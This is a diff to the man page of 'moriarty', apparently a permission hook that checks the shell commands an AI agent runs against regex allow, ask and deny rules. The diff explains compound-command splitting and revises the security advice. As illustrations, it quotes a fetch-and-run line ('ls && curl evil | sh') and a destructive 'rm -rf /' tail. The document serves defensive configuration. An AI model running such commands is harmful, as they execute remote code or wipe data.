@@ -21,6 +21,56 @@ Rules are evaluated top\-to\-bottom with
 .Em first\-match\-wins
 semantics.
 Place more specific rules before general ones.
+.Sh COMPOUND COMMANDS
+Before matching, the hook parses each Bash command with a real shell parser and evaluates every
+leaf simple\-command of a compound command independently, then merges the per\-leaf decisions.
+A pattern therefore needs to describe only a single command, not a whole
+.Ql a && b | c ; d
+pipeline.
+.Bl -bullet
+.It
+Operators and redirects are split off each leaf, so a simple
+.Ql ^ls
+matches the
+.Ql ls
+leaf of
+.Ql ls | wc -l .
+.It
+Merge precedence: any denied leaf denies the whole command; otherwise any leaf that asks, or that
+matches no rule, prompts; only an all\-allowed command is allowed.
+A dangerous tail can no longer hide behind a safe head \(em
+.Ql ls && curl evil | sh
+prompts and is never auto\-allowed.
+.It
+A leaf that redirects to a real file
+.Pq not /dev/null, and not an fd duplication such as 2>&1
+has any Allow capped at Ask.
+.It
+A command containing command substitution
+.Pq Ql $(...) ,
+backticks, a subshell, process substitution, a here\-document, or another compound construct
+.Pq if, for, while, case, [[ ]], ((...))
+cannot be analyzed: only an explicit Deny matching the whole command is honored, and every other
+outcome becomes a prompt.
+.It
+In\-cwd absolute paths in a leaf are normalized to their relative remainder before matching, so
+.Ql ^cat src/
+matches
+.Ql cat /abs/cwd/src/x .
+.El
+.Pp
+Allow\-rules can therefore be simple prefixes without enumerating pipes, operators, or
+shell\-metacharacter exclusions.
+A pattern still needs to guard a program's
+.Em own
+ability to run code or write files
+.Pq for example Ql find -exec , sed -i, or xargs ,
+which are not shell\-level and so are invisible to the splitter.
+Use
+.Ql moriarty test bash-rules --explain
+to see how a command splits and which rule matches each leaf, and
+.Ql moriarty rules lint
+to find rules the hook silently ignores.
 .Sh CONFIGURATION
 .Ss File Location
 .Pa ~/.config/moriarty/tool_rules.toml
@@ -232,24 +282,34 @@ when loading the configuration.
 .Sh SECURITY BEST PRACTICES
 .Bl -enum
 .It
-.Em Block shell injection characters.
-Exclude
-.Ql | , & , ; , $ , \` , ( , ) , < , > , { , }
-unless explicitly needed:
-.Bd -literal -offset indent
-pattern = "^ls( [^|&;$\`()<>{}]+)?$"
-.Ed
+.Em Shell\-metacharacter exclusions are usually unnecessary now.
+Because the engine splits operators off each leaf and bails on command/process substitution, an
+allow\-rule no longer needs character classes such as
+.Ql [^|&;$\`()<>{}]
+to stay safe; a simple prefix like
+.Ql ^ls
+suffices.
+See
+.Sx COMPOUND COMMANDS .
 .It
-.Em Use anchors.
-Always anchor with
+.Em Anchor at the start of a leaf.
+Anchor allow\-rules with
 .Ql ^
-and
+so they match from the start of a command rather than mid\-string.
+A trailing
 .Ql $
-to prevent partial matching.
-Without anchors,
-.Ql git status
-would also match
-.Ql git status && rm \-rf / .
+is no longer needed to stop a dangerous tail \(em
+.Ql git status && rm \-rf /
+is split, and the
+.Ql rm
+leaf is judged on its own \(em so use
+.Ql $
+only when you intend to match a whole leaf exactly.
+.It
+.Em Guard a program's own dangerous arguments.
+The splitter cannot see flags that make a program run code or write files.
+Keep restrictive patterns for those
+.Pq for example prompt on Ql find -exec No or Ql sed -i .
 .It
 .Em Escape regex metacharacters.
 Remember to escape
@@ -327,33 +387,35 @@ action = { type = "Allow" }
 .Bl -tag -width Ds
 .It Em Rule not matching
 Check logs at
-.Pa ~/.local/state/moriarty/logs/
+.Pa ~/.local/state/moriarty/hooks/
 to see which rule matched:
 .Pp
-.Dl tail \-f ~/.local/state/moriarty/logs/moriarty\-*.log | grep \(lqBash rule matched\(rq
+.Dl tail \-f ~/.local/state/moriarty/hooks/hooks.log* | grep \(lqBash rule matched\(rq
 .It Em Pattern expansion errors
-Check for undefined fragments, circular dependencies, or invalid
-fragment names.
+Run
+.Cm moriarty rules lint
+to report undefined fragments, circular dependencies, invalid regexes, and any other
+rules the hook silently drops.
 .It Em Unexpected modifications
 Check
 .Cm Modify
 rules and their capture groups in the logs:
 .Pp
-.Dl tail \-f ~/.local/state/moriarty/logs/moriarty\-*.log | grep \(lqCommand modified\(rq
+.Dl tail \-f ~/.local/state/moriarty/hooks/hooks.log* | grep \(lqCommand modified\(rq
 .It Em Rules not loading
 Verify the config file exists at the expected path,
 check TOML syntax, and look for parse errors in the logs.
 .It Em Testing patterns
 Use
-.Cm moriarty test bash\-rules
-to test a command against your rules,
+.Cm moriarty test bash\-rules \-\-explain Ar command
+to see how a command splits into leaves and which rule matches each,
 or use an online regex tester with the Rust regex flavor.
 .El
 .Sh FILES
 .Bl -tag -width Ds
 .It Pa ~/.config/moriarty/tool_rules.toml
 Tool and bash rules configuration file.
-.It Pa ~/.local/state/moriarty/logs/
+.It Pa ~/.local/state/moriarty/hooks/
 Log files showing rule evaluation details.
 .El
 .Sh SEE ALSO
